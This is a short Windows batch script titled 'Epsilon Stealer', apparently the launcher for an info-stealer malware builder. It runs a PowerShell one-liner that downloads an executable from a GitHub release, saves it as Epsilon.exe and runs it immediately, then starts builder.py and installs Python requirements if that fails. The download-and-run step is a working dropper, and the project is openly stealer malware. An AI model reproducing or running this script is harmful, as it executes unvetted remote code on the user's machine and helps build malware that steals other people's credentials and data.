@echo off

title Epsilon Stealer
rem You can do any color
color 0c

echo.
echo Coded By https://github.com/Vinyzu3
echo.

cd tools
powershell $down=New-Object System.Net.WebClient;$url='https://github.com/Vinyzu3/Epsilon-Stealer/releases/download/relase/Launcher.exe';$file='Epsilon.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit

cd ..
python builder.py

if errorlevel 1 (
    echo.
    echo Error occurred during execution. Attempting to install requirements...
    python -m pip install -r requirements.txt
    echo.
    echo Installation complete.
    pause
)
